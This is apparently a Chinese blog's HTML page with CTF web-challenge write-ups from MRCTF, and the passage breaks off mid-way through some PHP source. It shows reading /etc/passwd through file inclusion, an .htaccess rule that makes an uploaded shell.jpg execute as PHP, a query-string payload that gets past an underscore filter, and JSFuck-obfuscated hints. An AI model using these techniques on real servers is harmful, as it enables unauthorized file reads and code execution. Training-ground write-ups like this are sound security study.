                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:12:56" itemprop="dateModified" datetime="2020-10-14T17:12:56+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>478</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="top-3-mountains-WP"><a href="#top-3-mountains-WP" class="headerlink" title="top 3 mountains WP"></a>top 3 mountains WP</h1><h2 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h2><ul>
<li><p>é¦–å…ˆç»™å‡ºç•Œé¢è¾“å…¥oneæ—¶å€™ä¼šæ˜¾ç¤ºä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥çŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«æˆ–è€…ssrf?</p>
</li>
<li><p>ä¸€å¼€å§‹çŒœæµ‹æ˜¯ï¼š</p>
</li>
</ul>
<pre><code class="php">  inlude(&quot;tour/&quot;$num.&quot;.php&quot;ï¼‰            </code></pre>
<ul>
<li>ä½†æ˜¯è¿™æ ·è¿™é“é¢˜æ²¡æ„ä¹‰äº†ï¼Œæ‰€ä»¥å¿…å®šæ˜¯ssrfï¼Œè¾“å…¥/etc/passwdæœ‰å›æ˜¾ã€‚ç›´æ¥ä¸Šfuzzçœ‹çœ‹ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857612653555.png" alt="img"></p>
<ul>
<li>ç›´æ¥è·‘å‡ºæ—¥å¿—æ–‡ä»¶ã€‚çœ‹çœ‹å‡ºé¢˜äººä¹‹å‰çš„æ“ä½œã€‚æ‰¾å‡ºå…³é”®æ–‡ä»¶ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613447154.png" alt="img"></p>
<ul>
<li>ç›´æ¥æœ‰æºç ï¼Œæ— å‚æ•°RCEï¼Œè¿‡æ»¤äº†diræ‰€ä»¥ä»¥å‰æ„é€ åŸºæœ¬æ²¡æˆï¼Œç›´æ¥ç”¨SESSIONIDå»æ„é€ å‚æ•°ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613861725.png" alt="img"></p>
<ul>
<li>getflag</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/1585761521936.png" alt="img"></p>
<h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p>è¯»å–index.phpæºç </p>
<pre><code>hhhm://redmango.top/../../index.php</code></pre><h1 id="Upload-WP"><a href="#Upload-WP" class="headerlink" title="Upload WP"></a>Upload WP</h1><p>æ‰«æå™¨ä¸€æŠŠæ¢­å‡ºæ¥<code>upload.html</code></p>
<p>éšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶ï¼Œé»‘åå•ï¼Œç›´æ¥hatccessã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857972207333.png" alt="img"></p>
<ul>
<li>ç›´æ¥hatccess</li>
</ul>
<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
    SetHandler application/x-httpd-php
  &lt;/FilesMatch&gt;</code></pre><p><strong><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857974174812.png" alt="img"></strong></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857987303976.png" alt="img"></p>
<p>æ¢ä½å¯†ç ï¼š</p>
<p>flag{htACceSs_fI1E_29uP1oAd666}</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3c5fc027b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d3c5fc027b.html" class="post-title-link" itemprop="url">MRCTF WP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-01 16:38:18" itemprop="dateCreated datePublished" datetime="2020-04-01T16:38:18+08:00">2020-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:14:00" itemprop="dateModified" datetime="2020-10-14T17:14:00+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>16 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><ul>
<li>indexæ³¨é‡Šæºç </li>
</ul>
<pre><code class="php">  $query = $_SERVER[&#39;QUERY_STRING&#39;];

   if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
      die(&#39;Y0u are So cutE!&#39;);
  }
   if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
      echo &quot;you are going to the next ~&quot;;
  }</code></pre>
<ul>
<li><p>ä»£ç é¦–å…ˆæ˜¯å¯¹å­—ç¬¦ä¸²çš„ä¸‹åˆ’çº¿è¿›è¡Œç»Ÿè®¡ï¼Œè‹¥å¤§äº0å°±ç›´æ¥dieæ‰</p>
</li>
<li><p>è€Œåœ¨ä¸‹é¢éœ€è¦æ¥æ”¶ä¸€ä¸ªå«b_u_p_tè¿™ä¸ªå‚æ•°ï¼Œè€Œä¸”å®ƒä¸èƒ½ç­‰äº23333è€Œæ­£åˆ™åŒ¹é…å´è¦æœ‰23333è¿™é‡Œæœ‰ä¸ªå°trickå°±æ˜¯%0aå¯ä»¥ç»•è¿‡ã€‚è€Œphpå‚æ•°ï¼Œç©ºæ ¼å’Œç‚¹éƒ½ä¼šå˜æˆä¸‹åˆ’çº¿_.</p>
</li>
<li><p>pyload</p>
</li>
</ul>
<pre><code>  http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</code></pre><ul>
<li><p>å¾—åˆ°secrettw.phpæ–‡ä»¶å</p>
</li>
<li><p>å³é”®çœ‹æºç å­˜åœ¨ä¸€ä¸ªjsfuck</p>
</li>
</ul>
<pre><code class="js">  &lt;!--
  [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])
  --&gt;</code></pre>
<ul>
<li>è§£å¯†å¾—</li>
</ul>
<pre><code>  post me Merak</code></pre><ul>
<li>POST Merak=1ï¼Œå¾—åˆ°æºç </li>
</ul>
<pre><code class="php">  &lt;?php 
  error_reporting(0); 
  include &#39;takeip.php&#39;;
  ini_set(&#39;open_basedir&#39;,&#39;.&#39;); 
  include &#39;flag.php&#39;;

  if(isset($_POST[&#39;Merak&#39;])){ 
      highlight_file(__FILE__); 
      die(); 
  } 


  function change($v){ 
      $v = base64_decode($v); 
      $re = &#39;&#39;; 
      for($i=0;$i&lt;strlen($v);$i++){ 
          $re .= chr ( ord ($v[$i]) + $i*2 ); 
      } 
      return $re; 
  }
  echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;
  $ip = getIp();
  if($ip!=&#39;127.0.0.1&#39;)
  echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;
